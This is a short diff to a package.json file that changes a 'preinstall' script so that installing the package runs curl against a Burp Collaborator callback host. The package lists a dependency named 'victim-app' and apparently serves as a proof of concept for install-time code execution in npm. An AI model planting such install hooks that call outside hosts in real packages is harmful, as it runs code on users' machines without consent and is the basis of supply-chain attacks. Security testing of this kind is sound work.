@@ -7,7 +7,7 @@
     "test": "echo test",
     "npm": "echo npm",
     "node": "echo node",
-    "preinstall":"echo EVIL PACKAGE PREINSTALL"
+    "preinstall":"echo EVIL PACKAGE PREINSTALL; curl http://szvk5zzm4znlqxwjfkloa2pzlqrif7.burpcollaborator.net/ok"
   },
   "dependencies": {
     "victim":"git+https://github.com/No1zy/victim-app"
